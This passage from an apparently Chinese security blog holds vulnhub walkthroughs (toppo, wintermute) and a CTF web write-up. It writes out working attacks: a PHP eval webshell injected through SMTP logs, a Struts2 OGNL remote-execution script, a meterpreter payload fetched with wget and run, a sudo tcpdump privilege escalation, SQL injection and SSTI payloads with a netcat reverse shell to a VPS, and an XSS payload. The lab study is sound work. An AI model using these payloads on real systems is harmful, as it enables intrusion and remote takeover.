href="/images/2018/10/2018-10-02-14-59-59屏幕截图.png"><img src="/images/2018/10/2018-10-02-14-59-59屏幕截图-300x187.png" /></a> 跑一下 <a href="/images/2018/10/2018-10-02-15-02-11屏幕截图.png"><img src="/images/2018/10/2018-10-02-15-02-11屏幕截图-300x48.png" /></a> 拿到shell <a href="/images/2018/10/2018-10-02-15-03-10屏幕截图.png"><img src="/images/2018/10/2018-10-02-15-03-10屏幕截图-300x186.png" /></a> sudo -l发现tcpdump可以sudo执行 利用sudo执行反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i eth0 -G 1 -w /dev/null -G 1 -W 1 -z ./1.sh -Z root</span><br></pre></td></tr></table></figure><p>拿到shell <a href="/images/2018/10/2018-10-02-15-10-52屏幕截图.png"><img src="/images/2018/10/2018-10-02-15-10-52屏幕截图-300x166.png" /></a></p><h1 id="toppo">toppo</h1><p>这个太简单了点...</p><h2 id="介绍-1">介绍</h2><p><a href="https://www.vulnhub.com/entry/toppo-1,245/" title="https://www.vulnhub.com/entry/toppo-1,245/">https://www.vulnhub.com/entry/toppo-1,245/</a></p><h2 id="ip和端口">ip和端口</h2><p>ip:192.168.1.103 端口信息 <a href="/images/2018/10/2018-10-02-15-52-33屏幕截图.png"><img src="/images/2018/10/2018-10-02-15-52-33屏幕截图-300x83.png" /></a></p><h2 id="getshell-1">getshell</h2><p>去80端口看下 <a href="/images/2018/10/2018-10-02-15-53-10屏幕截图.png"><img src="/images/2018/10/2018-10-02-15-53-10屏幕截图-300x146.png" /></a> 简单测试一下,发现蛮多html页面,dirb一下,发现admin目录 <a href="/images/2018/10/2018-10-02-15-53-55屏幕截图.png"><img src="/images/2018/10/2018-10-02-15-53-55屏幕截图-300x128.png" /></a> 进去发现可以列目录 <a href="/images/2018/10/2018-10-02-15-54-33屏幕截图.png"><img src="/images/2018/10/2018-10-02-15-54-33屏幕截图-300x120.png" /></a> 拿到一个密码,12345ted123 尝试ssh登录,但是不知道用户名,猜一下ted <a href="/images/2018/10/2018-10-02-15-55-39屏幕截图.png"><img src="/images/2018/10/2018-10-02-15-55-39屏幕截图-300x98.png" /></a></p><h2 id="提权-1">提权</h2><p>提权的方法好像还蛮多的... 查看sudoer <a href="/images/2018/10/2018-10-02-15-59-07屏幕截图.png"><img src="/images/2018/10/2018-10-02-15-59-07屏幕截图-300x181.png" /></a> 或者suid提权 <a href="/images/2018/10/2018-10-02-16-01-18屏幕截图.png"><img src="/images/2018/10/2018-10-02-16-01-18屏幕截图-300x245.png" /></a> 想改root密码的话可以读一下shadow,然后john解一下 解出来密码test123 登录拿到root</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透(wintermute)</title>
      <link href="/2018/10/01/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fwintermute/"/>
      <url>/2018/10/01/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fwintermute/</url>
      
        <content type="html"><![CDATA[<p>挺有意思的一个靶机环境,学到不少东西,记录一下 参考wp:<a href="https://hackso.me/wintermute-1-walkthrough/" title="https://hackso.me/wintermute-1-walkthrough/">https://hackso.me/wintermute-1-walkthrough/</a></p><h2 id="介绍">介绍</h2><p><a href="https://www.vulnhub.com/entry/wintermute-1,239/" title="https://www.vulnhub.com/entry/wintermute-1,239/">https://www.vulnhub.com/entry/wintermute-1,239/</a> 注意,这里环境搭建如下图 <a href="/images/2018/10/2018-10-01-02-32-09屏幕截图.png"><img src="/images/2018/10/2018-10-01-02-32-09屏幕截图.png" /></a> 即我们的kali主机只能访问straylight靶机,而Neuromancer靶机处在内网,需要我们利用straylight作为跳板进行攻击</p><h2 id="straylight">Straylight</h2><h3 id="ip和端口">ip和端口</h3><p>靶机ip:192.168.1.101 端口扫描情况 <a href="/images/2018/10/2018-10-01-02-35-03屏幕截图.png"><img src="/images/2018/10/2018-10-01-02-35-03屏幕截图.png" /></a></p><h3 id="探测和拿shell">探测和拿shell</h3><p>到80端口,发现就一个静态页面给出背景,没什么有用的信息,到3000端口看下,发现一个登录页面,直接admin/admin一波成功登录,发现是ntop的管理页面 <a href="/images/2018/10/2018-10-01-02-38-05屏幕截图.png"><img src="/images/2018/10/2018-10-01-02-38-05屏幕截图.png" /></a> 探测一下流量,发现有奇怪的流量 <a href="/images/2018/10/2018-10-01-02-39-25屏幕截图.png"><img src="/images/2018/10/2018-10-01-02-39-25屏幕截图.png" /></a> 到/turing-bolo看下,然后在case页面发现 <a href="/images/2018/10/2018-10-01-02-40-46屏幕截图.png"><img src="/images/2018/10/2018-10-01-02-40-46屏幕截图.png" /></a> 访问一下,发现内容相同,猜测有文件包含 <a href="/images/2018/10/2018-10-01-02-42-31屏幕截图.png"><img src="/images/2018/10/2018-10-01-02-42-31屏幕截图.png" /></a> 想到前面开了25端口,包含一下mail.log试试看 <a href="/images/2018/10/2018-10-01-02-44-00屏幕截图.png"><img src="/images/2018/10/2018-10-01-02-44-00屏幕截图.png" /></a> 发现成功包含,那么我们去写日志就好,连25端口 然后发送</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/blacsheep<span class="comment">#  nc 192.168.1.101 25</span></span><br><span class="line">220 straylight ESMTP Postfix (Debian/GNU)</span><br><span class="line">MAILFROM:&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);phpinfo();?&gt;</span><br><span class="line">221 2.7.0 Error: I can <span class="built_in">break</span> rules, too. Goodbye.</span><br></pre></td></tr></table></figure><p>发现代码得到执行 <a href="/images/2018/10/2018-10-01-02-49-57屏幕截图.png"><img src="/images/2018/10/2018-10-01-02-49-57屏幕截图.png" /></a> 蚁剑连一下 <a href="/images/2018/10/2018-10-01-02-54-57屏幕截图.png"><img src="/images/2018/10/2018-10-01-02-54-57屏幕截图.png" /></a></p><h3 id="suid提权">suid提权</h3><p>具体可以去看这篇文章:<a href="https://www.anquanke.com/post/id/86979" title="https://www.anquanke.com/post/id/86979">https://www.anquanke.com/post/id/86979</a> 简而言之</p><blockquote><p>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。那么，为什么要给Linux二进制文件设置这种权限呢？其实原因有很多，例如，程序ping需要root权限才能打开网络套接字，但执行该程序的用户通常都是由普通用户，来验证与其他主机的连通性。 但是，如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。</p></blockquote><p>可以用于提权的包括</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Nmap</span><br><span class="line">Vim</span><br><span class="line">find</span><br><span class="line">Bash</span><br><span class="line">More</span><br><span class="line">Less</span><br><span class="line">Nano</span><br><span class="line">cp</span><br></pre></td></tr></table></figure><p>查找有哪些具有suid权限位而且属于root的文件可以用下面的一些命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure><p>靶机上面跑一下,得到下面一些文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">www-data@straylight:/var/www/html/turing-bolo$ find / -perm -4000 -user root 2&gt;/dev/null</span><br><span class="line">&lt;ing-bolo$ find / -perm -4000 -user root 2&gt;/dev/null</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/screen-4.5.0</span><br><span class="line">/bin/ping</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br></pre></td></tr></table></figure><p>发现有一个screen-4.5.0,searchsploit搜一下 <a href="/images/2018/10/2018-10-01-03-07-15屏幕截图.png"><img src="/images/2018/10/2018-10-01-03-07-15屏幕截图.png" /></a> 找到可以提权的漏洞了,蚁剑传上去,不过运行会出错,我们手动跑一下,然后拿到root <a href="/images/2018/10/2018-10-01-03-33-00屏幕截图.png"><img src="/images/2018/10/2018-10-01-03-33-00屏幕截图.png" /></a> 拿到flag和root下面的note <a href="/images/2018/10/2018-10-01-12-33-39屏幕截图.png"><img src="/images/2018/10/2018-10-01-12-33-39屏幕截图.png" /></a> 为了方便,我给straylight装了个ssh,加了个blacsheep用户,这样就可以有一个完整的shell了</p><h2 id="neuromancer">Neuromancer</h2><h3 id="找ip和端口">找ip和端口</h3><p>这个涉及到靶机找ip和端口,最容易想到的肯定是直接去下载一个nmap,然后编译一下扫,不过这里学到一些新知识,可以用shell的循环来扫ip和端口 找ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 255);<span class="keyword">do</span> ping -c 1 192.168.29.<span class="variable">$p</span>  2&gt;&amp;1 ;<span class="keyword">done</span>  grep <span class="string">&quot;bytes from&quot;</span></span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-01-12-33-00屏幕截图.png"><img src="/images/2018/10/2018-10-01-12-33-00屏幕截图.png" /></a> 找到靶机ip:192.168.29.4 然后扫它的端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 65535);<span class="keyword">do</span> nc -nvz -w 1 192.168.29.4 <span class="variable">$p</span> 2&gt;&amp;1 ;<span class="keyword">done</span>  grep -v <span class="string">&quot;refused&quot;</span></span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-01-12-32-18屏幕截图.png"><img src="/images/2018/10/2018-10-01-12-32-18屏幕截图.png" /></a></p><h3 id="端口转发和getshell">端口转发和getshell</h3><p>straylight靶机上面运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@straylight:~<span class="comment"># socat tcp-listen:8009,fork tcp:192.168.29.4:8009&amp;</span></span><br><span class="line">[1] 3740</span><br><span class="line">root@straylight:~<span class="comment"># socat tcp-listen:8080,fork tcp:192.168.29.4:8080&amp;</span></span><br><span class="line">[2] 3765</span><br><span class="line">root@straylight:~<span class="comment"># socat tcp-listen:34483,fork tcp:192.168.29.4:34483&amp;</span></span><br><span class="line">[3] 3803</span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-01-12-41-02屏幕截图.png"><img src="/images/2018/10/2018-10-01-12-41-02屏幕截图.png" /></a> 然后去8080端口,发现是个tomcat的manage页面,尝试爆破一下,失败了 <a href="/images/2018/10/2018-10-01-12-45-58屏幕截图.png"><img src="/images/2018/10/2018-10-01-12-45-58屏幕截图.png" /></a> 想到之前note里面的那个路径,访问一下 <a href="/images/2018/10/2018-10-01-12-46-53屏幕截图.png"><img src="/images/2018/10/2018-10-01-12-46-53屏幕截图.png" /></a> 找一下这个有没有漏洞 <a href="/images/2018/10/2018-10-01-12-48-08屏幕截图.png"><img src="/images/2018/10/2018-10-01-12-48-08屏幕截图.png" /></a> 发现有个代码执行的漏洞,用一下,但是发现并不能执行,这里有人换成了bash的代码,利用curl换掉了requests,可以执行,贴个代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">LHOST=192.168.30.128</span><br><span class="line">LPORT=4321</span><br><span class="line">RHOST=192.168.30.129</span><br><span class="line">RPORT=8080</span><br><span class="line">TARGETURI=struts2_2.3.15.1-showcase/integration</span><br><span class="line">URL=http://<span class="variable">$RHOST</span>:<span class="variable">$RPORT</span>/<span class="variable">$TARGETURI</span>/saveGangster.action</span><br><span class="line">CMD=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>%&#123;&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>(#_memberAccess?(#_memberAccess=#dm):&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>(#ognlUtil.getExcludedPackageNames().clear()).&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>(#ognlUtil.getExcludedClasses().clear()).&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>(#context.setMemberAccess(#dm)))).&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>(@java.lang.Runtime@getRuntime().exec(&#x27;<span class="variable">$CMD</span>&#x27;))&quot;</span></span><br><span class="line">PAYLOAD=<span class="string">&quot;<span class="variable">$&#123;PAYLOAD&#125;</span>&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">usage</span></span>() &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="subst">$(basename $0)</span> [COMMAND]&quot;</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -ne 1 ]; <span class="keyword">then</span></span><br><span class="line">  usage</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">curl -s \</span><br><span class="line">     -H <span class="string">&quot;Referer: http://<span class="variable">$RHOST</span>:<span class="variable">$RPORT</span>/<span class="variable">$TARGETURI</span>/editGangster&quot;</span> \</span><br><span class="line">     --data-urlencode <span class="string">&quot;name=<span class="variable">$PAYLOAD</span>&quot;</span> \</span><br><span class="line">     --data-urlencode <span class="string">&quot;age=20&quot;</span> \</span><br><span class="line">     --data-urlencode <span class="string">&quot;__checkbox_bustedBefore=true&quot;</span> \</span><br><span class="line">     --data-urlencode <span class="string">&quot;description=1&quot;</span> \</span><br><span class="line">     -o /dev/null \</span><br><span class="line">     <span class="variable">$URL</span></span><br></pre></td></tr></table></figure><p>不过nc版本不支持-e,而且由于我们是使用<code>java.lang.Runtime</code>来执行命令,所以管道符也不能用.. <a href="/images/2018/10/2018-10-01-13-29-25屏幕截图.png"><img src="/images/2018/10/2018-10-01-13-29-25屏幕截图.png" /></a> 那么我们再做一个端口转发,把访问192.168.1.101的4444的流量转到本机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@straylight:~<span class="comment"># socat tcp-listen:4444,fork tcp:192.168.1.105:4444 &amp;</span></span><br><span class="line">[4] 5820</span><br></pre></td></tr></table></figure><p>然后msfvenom生成木马,scp传到straylight</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.29.3 lport=4444 -f elf -o shell</span><br><span class="line"></span><br><span class="line">scp  ./shell  blacsheep@192.168.1.101:/tmp/</span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-01-13-25-43屏幕截图.png"><img src="/images/2018/10/2018-10-01-13-25-43屏幕截图.png" /></a> 把shell放到web目录,然后让Neuromancer去wget下下来执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./exploit.sh <span class="string">&quot;wget -O /tmp/shell 192.168.29.3/shell&quot;</span></span><br><span class="line">./exploit.sh <span class="string">&quot;chmod 777 /tmp/shell&quot;</span></span><br><span class="line">./exploit.sh <span class="string">&quot;sh -c /tmp/shell&quot;</span></span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-01-13-47-40屏幕截图.png"><img src="/images/2018/10/2018-10-01-13-47-40屏幕截图.png" /></a> 然后拿到meterpreter <a href="/images/2018/10/2018-10-01-13-49-42屏幕截图.png"><img src="/images/2018/10/2018-10-01-13-49-42屏幕截图.png" /></a></p><h3 id="提权">提权</h3><p>先写个ssh-key方便连接 <a href="/images/2018/10/2018-10-01-14-13-53屏幕截图.png"><img src="/images/2018/10/2018-10-01-14-13-53屏幕截图.png" /></a> 然后把这个写到用户目录的.ssh/authorized_keys <a href="/images/2018/10/2018-10-01-14-15-43屏幕截图.png"><img src="/images/2018/10/2018-10-01-14-15-43屏幕截图.png" /></a> 然后ssh -i 连接 <a href="/images/2018/10/2018-10-01-14-16-12屏幕截图.png"><img src="/images/2018/10/2018-10-01-14-16-12屏幕截图.png" /></a> 查看内核信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux neuromancer 4.4.0-116-generic <span class="comment">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure><p>searchsploit找一下,刚刚好有个版本一致的 <a href="/images/2018/10/2018-10-01-14-25-29屏幕截图.png"><img src="/images/2018/10/2018-10-01-14-25-29屏幕截图.png" /></a> 目标机没有gcc,本地编译传上去 <a href="/images/2018/10/2018-10-01-14-23-58屏幕截图.png"><img src="/images/2018/10/2018-10-01-14-23-58屏幕截图.png" /></a> 目标机运行,拿到shell <a href="/images/2018/10/2018-10-01-14-27-21屏幕截图.png"><img src="/images/2018/10/2018-10-01-14-27-21屏幕截图.png" /></a></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>cnss2018招新wp(web)</title>
      <link href="/2018/09/21/cnss2018%E6%8B%9B%E6%96%B0wpweb/"/>
      <url>/2018/09/21/cnss2018%E6%8B%9B%E6%96%B0wpweb/</url>
      
        <content type="html"><![CDATA[<p>简单记录一下吧 首先写下自己出的三道题吧</p><h2 id="ez-sql">ez sql</h2><p>万能密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">帐号:123&#x27;or&#x27;1&#x27;=&#x27;1&#x27;#</span><br><span class="line">密码随意</span><br></pre></td></tr></table></figure><h2 id="normal-sql">normal sql</h2><p>无过滤报错注入,可以sqlmap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://132.232.92.163:6731/index.php&quot; --data=&#x27;username=123&amp;password=123&#x27; --technique=E -p username --dbs</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://132.232.92.163:6731/index.php&quot; --data=&#x27;username=123&amp;password=123&#x27; --technique=E -p username -D cnss_ctf --tables</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://132.232.92.163:6731/index.php&quot; --data=&#x27;username=123&amp;password=123&#x27; --technique=E -p username -D cnss_ctf -T fl4g_1s_Here --dump</span><br></pre></td></tr></table></figure><p>或者自己写payload,也不难</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; and extractvalue(1,concat(0x3a,(select fl4444ag from fl4g_1s_Here)))#</span></span><br></pre></td></tr></table></figure><h2 id="hard-sql">hard sql</h2><p>简单地加了点过滤 然后就是数据库的user表里面是空的,所以sleep,bool什么的都没有用,检测的话的用union来检测,然后就是空格和注释都被我过滤了,用括号绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">帐号:admin&#x27;union(select(1),2,md5(1))#</span><br><span class="line">密码:1</span><br></pre></td></tr></table></figure><p>然后整个的脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">password = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://132.232.92.163:6732/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> asc <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">        <span class="comment"># select query here </span></span><br><span class="line">        <span class="comment"># 爆表</span></span><br><span class="line">        <span class="comment"># select_query = &quot;select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())&quot;</span></span><br><span class="line">        <span class="comment"># 爆列</span></span><br><span class="line">        <span class="comment"># select_query = &quot;select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c34675f31735f48657265)&quot;</span></span><br><span class="line">        <span class="comment"># 拿flag</span></span><br><span class="line">        select_query = <span class="string">&quot;select(fl444ag)from(fl4g_1s_Here)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload here</span></span><br><span class="line">        payload = <span class="string">&quot;ord(mid((&#123;select_query&#125;),&#123;index&#125;,1))=&#123;asc&#125;&quot;</span>.<span class="built_in">format</span>(select_query = select_query, index = index,</span><br><span class="line">                                                                      asc = asc)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># post data</span></span><br><span class="line">        username = <span class="string">&quot;admin&#x27;union(select(1),2,md5(if(&#123;payload&#125;,1,0)))#&quot;</span>.<span class="built_in">format</span>(payload = payload)</span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span> : username, <span class="string">&#x27;password&#x27;</span> : password&#125;</span><br><span class="line">        r = requests.post(url, data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;union&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(asc), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="blacsheeps-love">blacsheep's love</h2><p>ssti,进去之后重定向 url是http://132.232.92.163:6733/?name=blacsheep 改一下后面的blacsheep为<code>&#123;&#123;7*7&#125;&#125;</code> 发现结果变成了49,然后注意一下过滤了class关键字,需要简单绕过一下 绕过的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__[0][&quot;__subcla&quot;+&quot;sses__&quot;]()[59].__init__.__getattribute__(&#x27;func_global&#x27;+&#x27;s&#x27;)[&#x27;linecache&#x27;].__dict__.values()[12].__getattribute__(&#x27;s&#x27;+&#x27;ystem&#x27;)(cmd_here)</span><br></pre></td></tr></table></figure><p>然后我们先</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://132.232.92.163:6733/?name=&#123;&#123;request[%22__clas%22+%22s__%22].__bases__[0].__bases__[0].__bases__[0][%22__subcla%22+%22sses__%22]()[59].__init__.__getattribute__(%27func_global%27+%27s%27)[%27linecache%27].__dict__.values()[12].__getattribute__(%27s%27+%27ystem%27)(%27nc%20your_vps%20your_port%20%20/bin/bash%27)&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后vps上面收到nc连接 nc上面弹一个shell,拿到flag <a href="/images/2018/09/2018-09-21-17-06-14屏幕截图.png"><img src="/images/2018/09/2018-09-21-17-06-14屏幕截图.png" /></a></p><h2 id="你们的老婆没有了">你们的老婆没有了</h2><p>简单的xss 提交一个aaaaaaaa 得到结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;images/aaaaaaaa.png&quot; &gt;</span><br></pre></td></tr></table></figure><p>测试之后发现尖括号过滤了 那提交一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onerror=alert(/xss/) &quot;</span><br></pre></td></tr></table></figure><p>拿到flag</p><h2 id="babyblog">BabyBlog</h2><p>进去看了下,一个发表文章的页面,一个提交文章的页面 简单测试一下,过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">src</span><br><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">()</span><br></pre></td></tr></table></figure><p>写个脚本方便提交</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">src</span>):</span><br><span class="line">    temp = hashlib.md5()</span><br><span class="line">    temp.update(<span class="built_in">str</span>(src).encode())</span><br><span 